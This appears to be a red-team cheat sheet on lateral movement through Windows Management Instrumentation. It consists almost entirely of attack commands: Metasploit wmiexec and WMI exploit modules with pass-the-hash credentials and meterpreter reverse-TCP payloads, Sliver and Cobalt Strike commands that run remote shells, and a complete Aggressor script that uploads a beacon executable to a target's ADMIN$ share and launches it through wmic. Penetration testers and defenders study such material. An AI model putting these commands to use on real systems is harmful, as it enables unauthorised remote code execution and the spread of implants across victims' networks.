# Windows Management Instrumentation

## 01 - Metasploit

### 1.1 - Auxiliary Module

Use `wmiexec` to execute commands remotely.

```
msf > use auxiliary/scanner/smb/impacket/wmiexec

msf auxiliary(scanner/smb/impacket/wmiexec) > options

Module options (auxiliary/scanner/smb/impacket/wmiexec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND                     yes       The command to execute
   OUTPUT     true             yes       Get the output of the executed command
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     yes       The password for the specified username
   SMBUser                     yes       The username to authenticate as
   THREADS    1                yes       The number of concurrent threads (max one per host)

msf auxiliary(scanner/smb/impacket/wmiexec) > set rhosts <target_IP>

msf auxiliary(scanner/smb/impacket/wmiexec) > set output true

msf auxiliary(scanner/smb/impacket/wmiexec) > set smbuser <username>

msf auxiliary(scanner/smb/impacket/wmiexec) > set smbpass <password | aad3b435b51404eeaad3b435b51404ee:<nt_hash>>

msf auxiliary(scanner/smb/impacket/wmiexec) > set smbdomain <domain>

msf auxiliary(scanner/smb/impacket/wmiexec) > set threads 2

msf auxiliary(scanner/smb/impacket/wmiexec) > run command=<commands>
```

### 1.2 - Exploit Module

Execute WMI remotely.

```
msf > use exploit/windows/local/wmi

msf exploit(windows/local/wmi) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/wmi) > options

Module options (exploit/windows/local/wmi):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   RHOSTS                                yes       Target address range or CIDR identifier
   ReverseListenerComm                   no        The specific communication channel to use for this listener
   SESSION                               yes       The session to run this module on
   SMBDomain                             no        The Windows domain to use for authentication
   SMBPass                               no        The password for the specified username
   SMBUser                               no        The username to authenticate as
   TIMEOUT              10               yes       Timeout for WMI command in seconds


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Execute PowerShell WMI remotely.

```
msf > use exploit/windows/local/ps_wmi_exec

msf exploit(windows/local/ps_wmi_exec) > options

Module options (exploit/windows/local/ps_wmi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DOMAIN                     no        Domain or machine name
   PASSWORD                   no        Password to authenticate with
   RHOSTS                     no        Target address range or CIDR identifier
   SESSION                    yes       The session to run this module on
   USERNAME                   no        Username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal
```

Execute `wmic.exe` locally.

```
msf > use post/windows/gather/wmic_command

msf post(windows/gather/wmic_command) > options

Module options (post/windows/gather/wmic_command):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND                     no        WMIC command options.
   RESOURCE                    no        Full path to resource file to read commands from.
   RHOST      localhost        yes       Target address range
   SESSION                     yes       The session to run this module on
   SMBDomain                   no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   TIMEOUT    10               yes       Timeout for WMI command in seconds

msf post(windows/gather/wmic_command) > set session <session_ID>

msf post(windows/gather/wmic_command) > set rhost <target_IP>

msf post(windows/gather/wmic_command) > set smbuser <username>

msf post(windows/gather/wmic_command) > set smbpass <password | aad3b435b51404eeaad3b435b51404ee:<nt_hash>>

msf post(windows/gather/wmic_command) > run command=<WQL_query>
```

## 02 - Sliver

```
sliver (IMPLANT_NAME) > sharp-wmi action=exec computername=<IP> command=\"""C:\\Windows\\Temp\\shell.exe""\"
```

## 03 - Cobalt Strike

### 3.1 - Remote Execution

#### 3.1.1 - Execute Payload

```
beacon> remote-exec wmi <IP> C:\path\to\shell.exe

beacon> remote-exec wmi <IP> "rundll32 C:\path\to\shell.dll"

beacon> link <IP>
```

#### 3.1.2 - Execute Commands

```
beacon> remote-exec wmi <IP> <cmdlets>
```

### 3.2 - Spawn Implant Remotely

Name this file as `wmi-jump.cna`.

```perl
# $1 = bid (beacon_id), $2 = target, $3 = listener

$process_name = rand(@("svchost", "evil", "detectme"));

sub wmi_remote_spawn {
   local('$name $exedata');

   btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3) . ") via WMI", "T1047");

   # we need a random file name.
   $name = $process_name . rand(100) . ".exe";

   # generate an EXE. $arch defined via &lambda when this function was registered with
   # beacon_remote_exploit_register
   $exedata = artifact_payload($3, "exe", $arch);

   # upload the EXE to our target (directly)
   bupload_raw!($1, "\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name", $exedata);

   # execute this via WMI
   brun!($1, "wmic /node:\" $+ $2 $+ \" process call create \"\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name $+ \"");

   # assume control of our payload (if it's an SMB or TCP Beacon)
   beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("wmi", "x86", "Use WMI to run a Beacon payload", lambda(&wmi_remote_spawn, $arch => "x86"));
beacon_remote_exploit_register("wmi64", "x64", "Use WMI to run a Beacon payload", lambda(&wmi_remote_spawn, $arch => "x64"));
```

---
## References

### Source Repositories

- [SharpWMI](https://github.com/GhostPack/SharpWMI)

### Cobalt Strike

- [Cobalt Strike User Guide: Aggressor Script Beacon](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as_beacon.htm)

### Riccardo Ancarani

- [Riccardo Ancarani: Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)